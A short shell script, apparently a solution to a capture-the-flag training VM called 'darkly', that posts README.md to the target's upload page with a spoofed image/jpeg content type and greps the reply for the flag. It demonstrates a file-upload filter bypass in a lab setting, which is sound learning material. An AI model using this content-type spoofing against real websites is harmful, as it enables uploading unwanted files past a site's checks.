#!/bin/sh

## script to post the README.md file to upload page

if [ -z "$1" ]
  then
    echo "No argument supplied";
    echo "Usage : ./getflag.sh [ip_addr]"
    echo "[ip_addr] = your darkly VM's IP (example : 192.168.122.49)"
	exit 1
fi

# -s for silent mode, -X to specify the method, -F to add a field
curl -s -X POST -F 'Upload=Upload' -F 'uploaded=@README.md;type=image/jpeg' "http://$1/index.php?page=upload" | grep "flag"
